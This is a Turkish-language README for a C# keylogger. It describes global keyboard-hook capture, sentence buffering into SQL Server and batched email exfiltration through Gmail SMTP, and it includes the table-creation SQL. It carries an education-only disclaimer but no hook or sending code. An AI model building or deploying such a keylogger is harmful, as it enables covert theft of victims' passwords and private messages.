# C# Keylogger Uygulaması

**Uyarı:** Bu proje **sadece eğitim ve test amaçlıdır**. Başka bir kişinin bilgisi ve izni olmadan kullanımı yasa dışıdır ve etik dışıdır. Bu kodu izinsiz kullanmaktan doğacak tüm hukuki ve etik sorumluluklar kullanıcıya aittir.

## Özet

Windows işletim sistemi üzerinde çalışan bu uygulama, global keyboard hook ile tuş girişlerini yakalar, cümle bazında (nokta, soru işareti, ünlem veya yeni satır ile) tamponlayarak SQL Server veritabanına kaydeder ve belirlenen aralıklarla batch halinde Gmail SMTP üzerinden e-posta ile gönderir. Ayrıca uygulama içinde kullanıcı veri silme talebi gönderebilecek bir arayüz bulunmaktadır.

## Özellikler

- Global low-level keyboard hook ile tuş yakalama (WH_KEYBOARD_LL).
- Karakterleri `ToUnicode` ile yerel klavye düzenine göre çözümleme (shift, caps lock durumu dikkate alınır).
- Cümle bazında tamponlama ve veritabanına kayıt (TBL_LOGGER).
- Batch tabanlı e-posta gönderimi (Gmail SMTP, app.config ile konfigüre edilebilir).
- Gönderim deneme sayısı yönetimi; başarısız denemelerde `sendAttempts` arttırılır.
- Form kapanışında buffer temizliği ve hook kaldırma işlemleri ile güvenli kapanış.
- Kullanıcıdan gelen veri silme talebini e-posta ile yöneticilere iletme.

## Gereksinimler

- .NET Framework 4.8
- Visual Studio (veya uyumlu IDE)
- SQL Server (LocalDB / Local / Uzak)
- Gmail hesabı ve App Password (SMTP için)

## Veritabanı - Yapı

Aşağıdaki SQL, gerekli tabloyu oluşturmak içindir. `DboKeylogger` isimli veritabanını yaratıp tabloyu ekleyin.

```sql
CREATE DATABASE DboKeylogger;
GO

USE DboKeylogger;
GO

CREATE TABLE TBL_LOGGER (
    logId INT IDENTITY(1,1) PRIMARY KEY,
    logl NVARCHAR(MAX),
    tarih DATETIME,
    gonderildi BIT DEFAULT 0,
    sendAttempts INT DEFAULT 0
);
GO
